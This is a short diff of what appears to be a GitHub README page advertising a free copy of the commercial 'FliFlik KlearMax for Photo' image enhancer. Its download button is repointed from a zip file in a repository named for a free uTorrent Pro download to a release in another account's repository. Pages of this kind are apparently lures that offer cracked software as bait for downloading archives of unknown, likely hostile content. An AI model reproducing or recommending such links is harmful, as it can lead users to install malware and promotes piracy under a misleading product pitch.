@@ -8,5 +8,5 @@
 <h2>FliFlik KlearMax for Photo Free</h2>
 <p><strong>FliFlik KlearMax for Photo 2024 is a sophisticated artificial intelligence picture enhancer that seamlessly improves the clarity of images.</p>
 </ol>
-<a href="https://github.com/abilbiju/.utorrent-pro-download-for-free/releases/download/UU/ExtraSoft.zip">
+<a href="https://github.com/SafesystemDev/FliFlik-KlearMax-for-Photo/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
